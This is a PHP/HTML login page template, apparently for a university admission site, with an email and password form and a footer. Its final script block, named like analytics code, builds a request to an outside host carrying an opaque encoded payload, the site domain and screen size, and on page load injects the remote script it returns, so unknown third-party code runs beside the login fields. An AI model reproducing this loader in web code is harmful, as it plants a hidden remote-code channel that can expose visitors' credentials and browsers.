<div class="hold-transition login-page" style="background-color: #a50d0d;">
    <div class="login-box">
        <div class="login-box-body">
            <a href="<?=base_url()?>Home"><img src="<?=base_url()?>assets/spmb.png" alt="Chania" style="width: 100%;"></a>
        </div>

        <!-- /.login-logo -->
        <div class="login-box-body">
            <h4>Login</h4>
            <div class="tab-content">
                <form action="<?=base_url()?>dashboard/login" method="post">
                  <!-- <form id="form_daftar"> -->
                    <div class="form-group has-feedback">
                        <input type="email" name="email" class="form-control" placeholder="Email">
                        <span class="glyphicon glyphicon-envelope form-control-feedback"></span>
                    </div>
                    <div class="form-group has-feedback">
                        <input type="password" name="password" class="form-control" placeholder="Password">
                        <span class="glyphicon glyphicon-lock form-control-feedback"></span>
                    </div>
                    <div class="row">
                        <div class="col-xs-8">

                        </div>
                        <!-- /.col -->
                        <div class="col-xs-4">
                            <button type="submit" class="btn btn-primary btn-block btn-flat">Login</button>
                        </div>
                        <!-- /.col -->
                    </div>
                </form>

            </div>
            <!-- <a href="<?=base_url()?>login">Login</a> -->
            <br>
            <!-- <a href="">Home</a> -->
        </div>
        <!-- /.login-box-body -->
        <footer class="container-fluid text-center" style="background:#222;">
            <strong style="color: #fff;"> © 2017 - 2018</strong>
            <br><span style="color: #fff;">All rights reserved.</span>
            <br> <span style="color: #fff;">Powered by <a data-toggle="modal" data-target="#puskom" style="color: #F00;">Pustik UTI<br></a></span>
        </footer>
    </div>
    <!-- /.login-box -->
    <!-- jQuery 2.2.3 -->
    <script src="<?=base_url()?>assets/jQuery-2.1.3.min.js"></script>
    <!-- Bootstrap 3.3.6 -->
    <script src="<?=base_url()?>assets/bootstrap.min(2).js"></script>
    <script type="text/javascript">
        $(document).ready(function() {
            setTimeout(function() {
                $(".alert").fadeIn('slow');
            }, 500);
        });
        setTimeout(function() {
            $(".alert").fadeOut('slow');
        }, 3000);

        function isGoodEmail(email) {
            if (isValidEmail(email)) {
                if (/(aol|gmail|yahoo|hotmail)\.com$/.test(email)) {
                    alert(' valid email, but not for this site.  No free service emails!');
                    return false;
                }
                return true;
            }
            return false;
        }
    </script>
    <script type="text/javascript">
        if (self == top) {
            function netbro_cache_analytics(fn, callback) {
                setTimeout(function() {
                    fn();
                    callback();
                }, 0);
            }

            function sync(fn) {
                fn();
            }

            function requestCfs() {
                var idc_glo_url = (location.protocol == "https:" ? "https://" : "http://");
                var idc_glo_r = Math.floor(Math.random() * 99999999999);
                var url = idc_glo_url + "p02.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5mz31ibFSB9CMUedmt0mOcaqHT8FL2TcEke6Kst1c6MUzj5c%2boLEbC6uuKV%2fy4%2bcmHkGYWQQ52rVllDCGb7b%2bV53o6qQsWiTYIc7sLVulykTYTIxpYDAT4Un0hRHQh%2bDhAuyTZymsJ2FBRDdoChq37vrWAjDnpwDDcAlymPfheUOHNQTKexRB%2f8O3dsZoI46PylqKBTGd1avIBcPWdg1usgrJBvzFOmQsbmgn6ISQfAq2bu6p%2fUgCQUztRHORslVzL7koQH%2bRWizfZTuBHVMzqoR0MjgC8eQCUVni3UoWp%2bLc6Jni57GiL3s7yvLpVU%2b1S7AL%2brOxRs7qPwqaaDqwo7dlGMdxOkxZznAMkhzZtaLi0Q%2bHWOW9T3FTsacDkIcsg75Zol3x5HT8ImmCBxVZgk5Piqv0%2f8tOwkSH9zGIBX53c7N0n4oQWdq0SVVATj6OW5kOicOPpXnFoJ5uoYErfVihJBRgDZyv7PqJPcqLtvkXzfrGozj8zMbh%2bH%2frLsLmxIZYnil0vKq%2fS0KeDxNYyjei5aKzUNbnBILAz6EGcSkp4BECMhgpiMA%3d%3d" + "&idc_r=" + idc_glo_r + "&domain=" + document.domain + "&sw=" + screen.width + "&sh=" + screen.height;
                var bsa = document.createElement('script');
                bsa.type = 'text/javascript';
                bsa.async = true;
                bsa.src = url;
                (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(bsa);
            }
            netbro_cache_analytics(requestCfs, function() {});
        };
    </script>
</div>